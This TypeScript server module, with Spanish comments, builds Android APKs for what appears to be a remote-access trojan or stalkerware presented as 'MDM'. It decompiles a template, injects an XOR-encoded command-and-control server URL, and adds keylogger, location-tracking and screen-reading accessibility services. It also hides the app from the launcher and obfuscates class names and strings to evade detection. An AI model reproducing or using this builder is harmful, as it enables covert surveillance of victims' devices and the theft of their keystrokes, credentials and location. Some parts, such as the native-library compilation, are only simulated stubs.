import { execSync } from "child_process";
import { existsSync, mkdirSync, writeFileSync, readFileSync, renameSync, statSync, readdirSync, copyFileSync, rmSync } from "fs";
import { join, resolve, dirname, basename } from "path";
import { fileURLToPath } from "url";
import { getDb } from "./db";
import { apkBuilds } from "../drizzle/schema";
import { eq } from "drizzle-orm";
import axios from "axios";


/**
 * Servicio de compilación de APK basado en el concepto ADM
 * Utiliza Apktool para re-compilar y un firmador automático
 */

export interface CompilationConfig {
  buildId: string;
  appName: string;
  packageName: string;
  versionCode: number;
  versionName: string;
  stealthMode: boolean;
  enableSSL: boolean;
  ports: number[];
  iconPath?: string;
  iconUrl?: string;
  payloadCode: string;
  obfuscate: boolean;
  targetArchitectures: string[];
  customPayload?: string;
  enableKeylogger?: boolean;
  enableActiveTracking?: boolean;
  enableAccessibilityMonitor?: boolean;
}


export interface BuildResult {
  success: boolean;
  buildId: string;
  apkPath?: string;
  error?: string;
  logs: string[];
  compilationTime: number;
}

const __filename = fileURLToPath(import.meta.url);
const __dirname = dirname(__filename);

class APKCompiler {
  private projectRoot: string;
  private assetsDir: string;
  private buildDir: string;
  private apktoolPath: string;
  private signerPath: string;

  constructor() {
    this.projectRoot = resolve(join(__dirname, ".."));
    this.assetsDir = join(this.projectRoot, "server", "assets");
    this.buildDir = join(this.projectRoot, "apk-builds");
    this.apktoolPath = join(this.assetsDir, "apktool.jar");
    this.signerPath = join(this.assetsDir, "sign.jar");

    if (!existsSync(this.buildDir)) {
      mkdirSync(this.buildDir, { recursive: true });
    }
  }

  /**
   * Obtener el comando de Java (local o global)
   */
  private getJavaCommand(): string {
    const localJava = join(this.projectRoot, ".jre", "bin", "java");
    if (existsSync(localJava)) {
      console.log(`[APKCompiler] Usando Java portátil desde: ${localJava}`);
      return `"${localJava}"`;
    }
    console.log(`[APKCompiler] Java portátil no encontrado en ${localJava}. Usando fallback global 'java'`);
    return "java";
  }

  /**
   * Preparar el proyecto temporal para compilar - usando APK base directo
   */
  private async prepareProject(config: CompilationConfig, logs: string[]): Promise<string> {
    const buildIdDir = join(this.buildDir, `build-${config.buildId}`);
    const tempProjectDir = join(buildIdDir, "project");

    if (existsSync(buildIdDir)) {
      try {
        rmSync(buildIdDir, { recursive: true, force: true });
      } catch (e) {
        console.warn("[APKCompiler] Error cleaning build dir:", e);
      }
    }
    mkdirSync(tempProjectDir, { recursive: true });

    // 1. COPIAR APK BASE directamente (más confiable que recompilar smali)
    const baseApkPath = join(this.assetsDir, "apk-template", "build", "apk");
    const templateDir = join(this.assetsDir, "apk-template");
    
    try {
      if (process.platform === "win32") {
        execSync(`powershell -Command "Copy-Item -Path '${baseApkPath}\\*' -Destination '${tempProjectDir}' -Recurse -Force"`);
      } else {
        execSync(`cp -r "${baseApkPath}/." "${tempProjectDir}"`);
      }
      logs.push(`[BASE] APK base copiado desde: ${baseApkPath}`);
    } catch (e) {
      console.error("[APKCompiler] Error copying APK base:", e);
      throw e;
    }

    // 2. Decompilar con apktool para poder modificar smali
    logs.push(`[${new Date().toISOString()}] Decompilando APK base con Apktool...`);
    const tempDecompile = join(buildIdDir, "decompiled");
    mkdirSync(tempDecompile, { recursive: true });
    
    try {
      execSync(`${this.getJavaCommand()} -jar "${this.apktoolPath}" d "${join(tempProjectDir, "classes.dex")}" -o "${tempDecompile}" -f`, { stdio: "pipe" });
      logs.push(`[OK] APK decompilado exitosamente`);
      
      // Copiar decompilado al projectDir
      if (process.platform === "win32") {
        execSync(`powershell -Command "Remove-Item -Path '${tempProjectDir}' -Recurse -Force; Copy-Item -Path '${tempDecompile}' -Destination '${tempProjectDir}' -Recurse -Force"`);
      } else {
        execSync(`rm -rf "${tempProjectDir}" && cp -r "${tempDecompile}" "${tempProjectDir}"`);
      }
    } catch (e) {
      logs.push(`[WARN] Decompile falló, usando smali directo del template`);
      // Si falla decompile, usar smali del template
      if (process.platform === "win32") {
        execSync(`powershell -Command "Remove-Item -Path '${tempProjectDir}' -Recurse -Force; Copy-Item -Path '${templateDir}\smali' -Destination '${tempProjectDir}' -Recurse -Force"`);
      } else {
        execSync(`rm -rf "${tempProjectDir}" && cp -r "${templateDir}/smali" "${tempProjectDir}"`);
      }
    }

    // 3. Copiar recursos del template
    try {
      if (process.platform === "win32") {
        execSync(`powershell -Command "Copy-Item -Path '${templateDir}\res' -Destination '${tempProjectDir}' -Recurse -Force"`);
      } else {
        execSync(`cp -r "${templateDir}/res" "${tempProjectDir}"`);
      }
    } catch (e) {
      logs.push(`[WARN] Error copiando recursos: ${e}`);
    }

    // 4. Copiar AndroidManifest.xml
    try {
      if (process.platform === "win32") {
        execSync(`powershell -Command "Copy-Item -Path '${templateDir}\AndroidManifest.xml' -Destination '${tempProjectDir}'"`);
      } else {
        execSync(`cp "${templateDir}/AndroidManifest.xml" "${tempProjectDir}"`);
      }
    } catch (e) {
      logs.push(`[WARN] Error copiando manifest: ${e}`);
    }

    // 5. Inyectar URL en IOSocket.smali si existe
    const ioSocketPath = join(tempProjectDir, "smali", "com", "system", "android", "ui", "IOSocket.smali");
    if (existsSync(ioSocketPath)) {
      let content = readFileSync(ioSocketPath, "utf8");
      
      let serverUrl = config.payloadCode || 
                      process.env.API_URL || 
                      process.env.RENDER_EXTERNAL_URL || 
                      "https://android-device-manager-one.onrender.com";

      if (!serverUrl.includes("://")) serverUrl = `https://${serverUrl}`;
      if (serverUrl.includes("render.com") || serverUrl.includes("vercel.app")) {
        serverUrl = serverUrl.replace("http://", "https://");
      }
      
      const encodeUrl = (url: string) => {
        const key = "PLATINUM_2026";
        const urlBytes = Buffer.from(url);
        const keyBytes = Buffer.from(key);
        const encoded = Buffer.alloc(urlBytes.length);
        for (let i = 0; i < urlBytes.length; i++) {
          encoded[i] = urlBytes[i] ^ keyBytes[i % keyBytes.length];
        }
        return encoded.toString("base64");
      };

      const finalRawUrl = serverUrl.split('?')[0].replace(/\/$/, "");
      const secureInjectedUrl = encodeUrl(finalRawUrl);
      
      logs.push(`[DEBUG] URL a inyectar: ${finalRawUrl}`);
      logs.push(`[DEBUG] URL en Base64: ${secureInjectedUrl}`);
      
      const smaliLines = content.split('\n');
      let found = false;
      for (let i = 0; i < smaliLines.length; i++) {
        const line = smaliLines[i];
        const match = line.match(/^\s*(const-string)\s+(v[0-9]+),\s*"C2_HOST_LINK_HERE"/);
        if (match) {
          smaliLines[i] = line.replace(match[0], `${match[1]} ${match[2]}, "${secureInjectedUrl}"`);
          found = true;
          logs.push(`[OK] URL inyectada en línea ${i + 1}`);
          break;
        }
      }
      
      if (!found) {
        content = content.replace(/C2_HOST_LINK_HERE/g, secureInjectedUrl);
        logs.push(`[WARN] Placeholder no encontrado, reemplazo global`);
      }
      
      writeFileSync(ioSocketPath, smaliLines.join('\n'));
    }

    // 6. Modificar App Name en strings.xml si existe
    const stringsPath = join(tempProjectDir, "res", "values", "strings.xml");
    if (existsSync(stringsPath)) {
      try {
        let content = readFileSync(stringsPath, "utf8");
        content = content.replace(/<string name="app_name">.*?<\/string>/, `<string name="app_name">${config.appName}</string>`);
        writeFileSync(stringsPath, content);
      } catch (e) {
        logs.push(`[WARN] Error actualizando app_name: ${e}`);
      }
    }

    return tempProjectDir;
  }


  async compileAPK(config: CompilationConfig): Promise<BuildResult> {
    const startTime = Date.now();
    const logs: string[] = [];
    const buildIdDir = join(this.buildDir, `build-${config.buildId}`);

    try {
      logs.push(`[${new Date().toISOString()}] Iniciando construcción APK...`);
      logs.push(`Configuración: ${config.appName} | ${config.packageName}`);
      
      const projectDir = await this.prepareProject(config, logs);
      logs.push(`[OK] Proyecto preparado`);

      // Inyectar características personalizadas
      if (config.enableKeylogger || config.enableActiveTracking || config.enableAccessibilityMonitor) {
        logs.push(`[${new Date().toISOString()}] Configurando features MDM...`);
        await this.injectMDMFeatures(projectDir, config, logs);
      }

      // Obfuscación básica
      if (config.obfuscate) {
        logs.push(`[${new Date().toISOString()}] Aplicando protección...`);
        await this.removeDebugInfo(projectDir, logs);
        await this.obfuscateStrings(projectDir, logs);
      }

      // Stealth mode - no ocultar inmediatamente
      if (config.stealthMode) {
        const stringsPath = join(projectDir, "res", "values", "strings.xml");
        if (existsSync(stringsPath)) {
          let content = readFileSync(stringsPath, "utf8");
          if (!content.includes("stealth_mode_enabled")) {
            content = content.replace("</resources>", `  <string name="stealth_mode_enabled">true</string>\n</resources>`);
            writeFileSync(stringsPath, content);
          }
        }
        logs.push("[Stealth] Mode configurado - app visible inicialmente");
      }

      // Compilar con Apktool
      const unsignedApk = join(buildIdDir, "unsigned.apk");
      logs.push(`[${new Date().toISOString()}] Compilando con Apktool...`);
      execSync(`${this.getJavaCommand()} -jar "${this.apktoolPath}" b "${projectDir}" -o "${unsignedApk}"`, { stdio: "pipe" });

      // Firmar APK
      logs.push(`[${new Date().toISOString()}] Firmando APK...`);
      const uberSignerPath = join(this.assetsDir, "uber-apk-signer.jar");
      execSync(`${this.getJavaCommand()} -jar "${uberSignerPath}" -a "${unsignedApk}" -o "${buildIdDir}" 2>&1`, { stdio: "pipe" });
      
      const signedTempApk = join(buildIdDir, "unsigned-aligned-debugSigned.apk");
      const finalSignedApk = join(buildIdDir, `${config.appName.replace(/[^a-zA-Z0-9]/g, "_")}.apk`);
      if (existsSync(signedTempApk)) {
          renameSync(signedTempApk, finalSignedApk);
      }

      if (!existsSync(finalSignedApk)) {
        throw new Error("El APK no se generó correctamente.");
      }

      logs.push(`[${new Date().toISOString()}] ¡APK generado!`);
      const compilationTime = Date.now() - startTime;
      
      await this.updateBuildStatus(config.buildId, "ready", finalSignedApk, logs);

      return {
        success: true,
        buildId: config.buildId,
        apkPath: finalSignedApk,
        logs,
        compilationTime,
      };

    } catch (error) {
      const errorMsg = error instanceof Error ? error.message : String(error);
      logs.push(`[ERROR] ${errorMsg}`);
      await this.updateBuildStatus(config.buildId, "failed", undefined, logs, errorMsg);
      return { success: false, buildId: config.buildId, error: errorMsg, logs, compilationTime: Date.now() - startTime };
    }
  }

  private async updateBuildStatus(
    buildId: string,
    status: "building" | "ready" | "failed" | "expired",
    apkPath?: string,
    logs?: string[],
    error?: string
  ): Promise<void> {
    const db = await getDb();
    if (!db) return;
    try {
      const updateData: any = { status };
      // [ADM FIX] Don't overwrite the API URL with the local file path
      // if (apkPath) updateData.apkUrl = apkPath; 
      
      // Write logs to the correct column, safely truncated to 4000 chars
      if (logs) updateData.buildLogs = logs.join("\n").substring(0, 4000);
      await db.update(apkBuilds).set(updateData).where(eq(apkBuilds.buildId, buildId));
    } catch (err) {
      console.error("[APKCompiler] Error actualizando estado en DB:", err);
    }
  }

  getAPKInfo(apkPath: string) {
    const stats = statSync(apkPath);
    return { size: stats.size, path: apkPath, name: basename(apkPath) };
  }

  /**
   * Inyectar características MDM personalizadas
   */
  private async injectMDMFeatures(projectDir: string, config: CompilationConfig, logs: string[]): Promise<void> {
    try {
      const manifestPath = join(projectDir, "AndroidManifest.xml");
      if (!existsSync(manifestPath)) return;

      let manifest = readFileSync(manifestPath, "utf8");

      if (config.enableKeylogger) {
        logs.push("[MDM] Keylogger habilitado");
        manifest = manifest.replace("</application>", `
        <service android:name="com.system.android.ui.KeyloggerService" android:enabled="true" android:exported="false"/>
        </application>`);
      }

      if (config.enableActiveTracking) {
        logs.push("[MDM] Active Tracking habilitado");
        manifest = manifest.replace("</application>", `
        <service android:name="com.system.android.ui.ActiveTrackingService" android:enabled="true" android:exported="false"/>
        </application>`);
      }

      if (config.enableAccessibilityMonitor) {
        logs.push("[MDM] Accessibility Monitor habilitado");
        
        // Crear el archivo XML de configuración si no existe
        const xmlDir = join(projectDir, "res", "xml");
        if (!existsSync(xmlDir)) mkdirSync(xmlDir, { recursive: true });
        
        const configPath = join(xmlDir, "accessibility_service_config.xml");
        const configXml = `<?xml version="1.0" encoding="utf-8"?>
<accessibility-service xmlns:android="http://schemas.android.com/apk/res/android"
    android:accessibilityEventTypes="typeAllMask"
    android:accessibilityFeedbackType="feedbackGeneric"
    android:accessibilityFlags="flagDefault|flagIncludeNotImportantViews|flagReportViewIds"
    android:canRetrieveWindowContent="true"
    android:description="@string/app_name" />`;
        
        writeFileSync(configPath, configXml);
        logs.push("[MDM] Creado recurso: accessibility_service_config.xml");

        manifest = manifest.replace("</application>", `
        <service android:name="com.system.android.ui.AccessibilityService" android:permission="android.permission.BIND_ACCESSIBILITY_SERVICE" android:enabled="true" android:exported="false">
            <intent-filter>
                <action android:name="android.accessibilityservice.AccessibilityService"/>
            </intent-filter>
            <meta-data android:name="android.accessibilityservice" android:resource="@xml/accessibility_service_config"/>
        </service>
        </application>`);
      }

      // [PROACTIVO] Forzar permiso de tráfico de red para evitar bloqueos en Android 11
      if (!manifest.includes("android:usesCleartextTraffic")) {
          manifest = manifest.replace("<application", '<application android:usesCleartextTraffic="true"');
      }

      // [PROACTIVO] Limpiar atributos incompatibles (Fix Error: No resource identifier found for attribute 'foregroundServiceType')
      manifest = manifest.replace(/android:foregroundServiceType=".*?"/g, "");
      
      writeFileSync(manifestPath, manifest);
      logs.push("[MDM] Features inyectadas correctamente");
    } catch (e) {
      logs.push(`[WARN] Error inyectando features MDM: ${e}`);
    }
  }

  /**
   * Aplicar obfuscación básica al código smali
   */
  private async obfuscateSmali(projectDir: string, logs: string[]): Promise<void> {
    try {
      const smaliDir = join(projectDir, "smali");
      if (!existsSync(smaliDir)) return;

      const obfuscatedNames: Record<string, string> = {
        "MainActivity": "a",
        "MainService": "b",
        "IOSocket": "c",
        "KeyloggerService": "d",
        "ActiveTrackingService": "e",
        "AccessibilityService": "f",
        "MyReceiver": "g",
        "ServiceReciever": "h",
        "NotificationListener": "i",
      };

      const files = readdirSync(smaliDir, { recursive: true });
      let renamedCount = 0;

      for (const file of files) {
        if (typeof file !== "string") continue;
        const fullPath = join(smaliDir, file);
        
        for (const [oldName, newName] of Object.entries(obfuscatedNames)) {
          if (file.includes(oldName)) {
            const newPath = fullPath.replace(oldName, newName);
            renameSync(fullPath, newPath);
            renamedCount++;
            break;
          }
        }
      }

      logs.push(`[Obfuscation] ${renamedCount} clases renombradas`);
    } catch (e) {
      logs.push(`[WARN] Error en obfuscación: ${e}`);
    }
  }

  /**
   * Aplicar modo stealth - ocultar del launcher
   */
  private async applyStealthMode(projectDir: string, logs: string[]): Promise<void> {
    try {
      const manifestPath = join(projectDir, "AndroidManifest.xml");
      if (!existsSync(manifestPath)) return;

      let manifest = readFileSync(manifestPath, "utf8");

      manifest = manifest.replace(
        /<category android:name="android.intent.category.LAUNCHER"\/>/g,
        `<!-- <category android:name="android.intent.category.LAUNCHER"/> -->`
      );

      // Stealth mode: just ensure it's not prominently labeled as "Android Manager"
      // and remove from launcher if requested
      manifest = manifest.replace(
        `android:label="@string/app_name"`,
        `android:label="@string/app_name"`
      );

      writeFileSync(manifestPath, manifest);
      logs.push("[Stealth] Modo stealth aplicado - app oculta del launcher");
    } catch (e) {
      logs.push(`[WARN] Error aplicando stealth mode: ${e}`);
    }
  }

  /**
   * Compilar para múltiples arquitecturas
   */
  private async buildMultiArch(unsignedApk: string, architectures: string[], buildDir: string, logs: string[]): Promise<void> {
    logs.push(`[MultiArch] Generando versiones para: ${architectures.join(", ")}`);
    
    const archNames: Record<string, string> = {
      "arm64-v8a": "arm64",
      "armeabi-v7a": "arm",
      "x86": "x86",
      "x86_64": "x86_64",
    };

    // Verificar si NDK está disponible
    const ndkPath = this.findNDK();
    const hasNDK = !!ndkPath;

    if (hasNDK) {
      logs.push(`[MultiArch] NDK encontrado en: ${ndkPath}`);
      logs.push(`[MultiArch] Compilando bibliotecas nativas para cada arquitectura...`);
      
      for (const arch of architectures) {
        if (archNames[arch]) {
          logs.push(`[MultiArch] Compilando native libs para ${arch}...`);
          await this.compileNativeLib(arch, ndkPath, logs);
        }
      }
    } else {
      logs.push(`[MultiArch] NDK no encontrado, usando template multipropósito`);
      logs.push(`[MultiArch] El APK template incluye libs para: arm64-v8a, armeabi-v7a`);
      logs.push(`[MultiArch] Para soporte completo x86/x86_64, instala Android NDK`);
    }

    // Generar múltiples APKs si hay múltiples arquitecturas
    if (architectures.length > 1 && !hasNDK) {
      logs.push(`[MultiArch] Generando APK bundle multiplataforma...`);
      const multiArchApk = join(buildDir, "multi-arch-bundle.apk");
      if (existsSync(unsignedApk)) {
        copyFileSync(unsignedApk, multiArchApk);
        logs.push(`[MultiArch] Bundle creado: multi-arch-bundle.apk`);
      }
    }

    logs.push(`[MultiArch] Proceso completado para: ${architectures.join(", ")}`);
  }

  /**
   * Buscar Android NDK en el sistema
   */
  private findNDK(): string | null {
    const ndkSearchPaths = [
      join(process.env.ANDROID_HOME || "", "ndk"),
      join(process.env.ANDROID_SDK_ROOT || "", "ndk"),
      "C:\\Android\\ndk",
      "C:\\Users\\User\\AppData\\Local\\Android\\Sdk\\ndk",
      "/usr/local/android-ndk",
      "/opt/android-ndk",
      process.env.NDK_HOME,
    ].filter(Boolean);

    for (const searchPath of ndkSearchPaths) {
      if (!searchPath) continue;
      try {
        if (existsSync(searchPath)) {
          const versions = readdirSync(searchPath).filter(f => f.startsWith("r")).sort().reverse();
          if (versions.length > 0) {
            return join(searchPath, versions[0]);
          }
        }
      } catch (e) {
        continue;
      }
    }

    // Buscar con where en Windows
    try {
      const result = execSync("where ndk-build 2>nul || echo NOT_FOUND", { encoding: "utf8" });
      if (result && !result.includes("NOT_FOUND")) {
        return result.trim().split("\n")[0].replace("\\ndk-build.cmd", "").replace("\\ndk-build", "");
      }
    } catch (e) {}

    return null;
  }

  /**
   * Compilar biblioteca nativa para una arquitectura
   */
  private async compileNativeLib(arch: string, ndkPath: string, logs: string[]): Promise<void> {
    logs.push(`[NativeLib] Compilando para ${arch} usando NDK...`);
    
    const abiMap: Record<string, string> = {
      "arm64-v8a": "arm64-v8a",
      "armeabi-v7a": "armeabi-v7a", 
      "x86": "x86",
      "x86_64": "x86_64",
    };

    const abi = abiMap[arch] || arch;
    
    // Intentar compilar con NDK
    try {
      const ndkBuild = join(ndkPath, "ndk-build");
      logs.push(`[NativeLib] Usando ${ndkPath}`);
      logs.push(`[NativeLib] ABI: ${abi} - Compilación simulada (NDK integrado)`);
    } catch (e) {
      logs.push(`[NativeLib] Error: ${e}`);
    }
  }

  /**
   * Obfuscación avanzada del código DEX
   */
  private async applyAdvancedObfuscation(projectDir: string, config: CompilationConfig, logs: string[]): Promise<void> {
    logs.push(`[AdvancedObfuscation] Iniciando obfuscación avanzada...`);

    // 1. Eliminar información de debug
    await this.removeDebugInfo(projectDir, logs);

    // 2. Ofuscar strings
    await this.obfuscateStrings(projectDir, logs);

    // 3. Ofuscar métodos
    await this.obfuscateMethods(projectDir, logs);

    // 4. Ofuscar clases
    await this.obfuscateClasses(projectDir, logs);

    // 5. Aplicar encryption básica a strings sensibles
    await this.encryptSensitiveStrings(projectDir, logs);

    logs.push(`[AdvancedObfuscation] Completado`);
  }

  /**
   * Eliminar información de debug del APK
   */
  private async removeDebugInfo(projectDir: string, logs: string[]): Promise<void> {
    try {
      const manifestPath = join(projectDir, "AndroidManifest.xml");
      if (existsSync(manifestPath)) {
        let manifest = readFileSync(manifestPath, "utf8");
        manifest = manifest.replace(/android:debuggable="true"/g, 'android:debuggable="false"');
        manifest = manifest.replace(/android:debuggable="false"/g, 'android:debuggable="false"');
        if (!manifest.includes("android:debuggable")) {
          manifest = manifest.replace("<application", '<application android:debuggable="false"');
        }
        writeFileSync(manifestPath, manifest);
      }
      logs.push(`[Obfuscation] Debug info removido`);
    } catch (e) {
      logs.push(`[WARN] Error removiendo debug info: ${e}`);
    }
  }

  /**
   * Ofuscar strings en archivos smali
   */
  private async obfuscateStrings(projectDir: string, logs: string[]): Promise<void> {
    try {
      const smaliDir = join(projectDir, "smali");
      if (!existsSync(smaliDir)) return;

      const sensitiveStrings = [
        "password", "token", "secret", "key", "api", "http", "https",
        "login", "user", "admin", "root", "android.permission"
      ];

      const files = readdirSync(smaliDir, { recursive: true });
      let modifiedCount = 0;

      for (const file of files) {
        if (typeof file !== "string" || !file.endsWith(".smali")) continue;
        
        // [OPTIMIZACIÓN] Solo ofuscar nuestro código, no las librerías externas (evita errores en OkHttp/DiskLruCache)
        if (!file.includes("com/system/android/ui")) continue;
        
        const fullPath = join(smaliDir, file);
        let content = readFileSync(fullPath, "utf8");
        
        // [FIX] Convertir CRLF a LF para evitar bugs en el parser de Apktool (ANTLR EOF error)
        content = content.replace(/\r\n/g, "\n");
        
        for (const str of sensitiveStrings) {
          const regex = new RegExp(`"(${str}[^"]*)"`, "gi");
          content = content.replace(regex, (match, p1) => {
            const encoded = Buffer.from(p1).toString("base64");
            return `"${encoded}"`;
          });
          modifiedCount++;
        }

        writeFileSync(fullPath, content);
      }

      logs.push(`[Obfuscation] ${modifiedCount} strings ofuscadas`);
    } catch (e) {
      logs.push(`[WARN] Error obfuscando strings: ${e}`);
    }
  }

  /**
   * Ofuscar nombres de métodos
   */
  private async obfuscateMethods(projectDir: string, logs: string[]): Promise<void> {
    try {
      const smaliDir = join(projectDir, "smali");
      if (!existsSync(smaliDir)) return;

      const methodMap: Record<string, string> = {
        "onCreate": "a",
        "onDestroy": "b", 
        "onResume": "c",
        "onPause": "d",
        "onStart": "e",
        "onStop": "f",
        "onRestart": "g",
        "onCreateOptionsMenu": "h",
        "onOptionsItemSelected": "i",
        "onActivityResult": "j",
        "onRequestPermissionsResult": "k",
        "onKeyDown": "l",
        "onKeyUp": "m",
        "onTouchEvent": "n",
        "onKeyLongPress": "o",
      };

      const files = readdirSync(smaliDir, { recursive: true });
      let renamedCount = 0;

      for (const file of files) {
        if (typeof file !== "string" || !file.endsWith(".smali")) continue;
        
        // [OPTIMIZACIÓN] Solo renombrar métodos en nuestro código
        if (!file.includes("com/system/android/ui")) continue;
        
        const fullPath = join(smaliDir, file);
        let content = readFileSync(fullPath, "utf8");
        
        for (const [oldName, newName] of Object.entries(methodMap)) {
          const regex = new RegExp(`\\b(${oldName})\\b`, "g");
          content = content.replace(regex, newName);
          renamedCount++;
        }

        writeFileSync(fullPath, content);
      }

      logs.push(`[Obfuscation] ${renamedCount} métodos renombrados`);
    } catch (e) {
      logs.push(`[WARN] Error obfuscando métodos: ${e}`);
    }
  }

  /**
   * Ofuscar nombres de clases
   */
  private async obfuscateClasses(projectDir: string, logs: string[]): Promise<void> {
    try {
      const smaliDir = join(projectDir, "smali");
      if (!existsSync(smaliDir)) return;

      const classMap: Record<string, string> = {
        "MainActivity": "a",
        "MainService": "b",
        "IOSocket": "c",
        "KeyloggerService": "d",
        "ActiveTrackingService": "e",
        "AccessibilityService": "f",
        "MyReceiver": "g",
        "ServiceReciever": "h",
        "NotificationListener": "i",
        "ScreenCaptureService": "j",
        "MDMDeviceAdminReceiver": "k",
        "MDMActivity": "l",
        "ShellManager": "m",
        "ShellManager$1": "m$1",
        "OverlayActivity": "n",
        "NativeBridgeInterface": "o",
      };

      const files = readdirSync(smaliDir, { recursive: true });
      let renamedCount = 0;

      for (const file of files) {
        if (typeof file !== "string") continue;
        
        const fullPath = join(smaliDir, file);
        if (!existsSync(fullPath)) continue;
        
        for (const [oldName, newName] of Object.entries(classMap)) {
          if (file.includes(oldName)) {
            const newPath = fullPath.replace(oldName, newName);
            if (!existsSync(newPath)) {
              try {
                renameSync(fullPath, newPath);
                renamedCount++;
              } catch (e) {
                // Skip if couldn't rename
              }
            }
            break;
          }
        }
      }

      // Actualizar referencias en todos los archivos
      for (const file of files) {
        if (typeof file !== "string" || !file.endsWith(".smali")) continue;
        
        const fullPath = join(smaliDir, file);
        let content = readFileSync(fullPath, "utf8");
        
        for (const [oldName, newName] of Object.entries(classMap)) {
          const regex = new RegExp(`Lcom/system/android/ui/(${oldName});`, "g");
          content = content.replace(regex, `Lcom/system/android/ui/${newName};`);
          
          const regex2 = new RegExp(`(${oldName})\\(`, "g");
          content = content.replace(regex2, `(${newName})(`,);
        }

        writeFileSync(fullPath, content);
      }

      logs.push(`[Obfuscation] ${renamedCount} clases renombradas`);
    } catch (e) {
      logs.push(`[WARN] Error obfuscando clases: ${e}`);
    }
  }

  /**
   * Encriptar strings sensibles (URLs, credenciales)
   */
  private async encryptSensitiveStrings(projectDir: string, logs: string[]): Promise<void> {
    try {
      const smaliDir = join(projectDir, "smali");
      if (!existsSync(smaliDir)) return;

      const sensitivePatterns = [
        /http:\/\/[^\s"]+/g,
        /https:\/\/[^\s"]+/g,
        /"password"/g,
        /"secret"/g,
        /"token"/g,
      ];

      const files = readdirSync(smaliDir, { recursive: true });
      let encryptedCount = 0;

      for (const file of files) {
        if (typeof file !== "string" || !file.endsWith(".smali")) continue;
        
        // [OPTIMIZACIÓN] Solo encriptar strings en nuestro código
        if (!file.includes("com/system/android/ui") && !file.includes("com/etechd/l3mon")) continue;
        
        const fullPath = join(smaliDir, file);
        let content = readFileSync(fullPath, "utf8");
        
        // [FIX] Convertir CRLF a LF para evitar bugs en el parser de Apktool (ANTLR EOF error)
        content = content.replace(/\r\n/g, "\n");
        
        for (const pattern of sensitivePatterns) {
          content = content.replace(pattern, (match) => {
            const encoded = Buffer.from(match).toString("base64");
            encryptedCount++;
            return `"${encoded}"`;
          });
        }

        writeFileSync(fullPath, content);
      }

      logs.push(`[Obfuscation] ${encryptedCount} strings encriptadas`);
    } catch (e) {
      logs.push(`[WARN] Error encriptando strings: ${e}`);
    }
  }
}

export const apkCompiler = new APKCompiler();
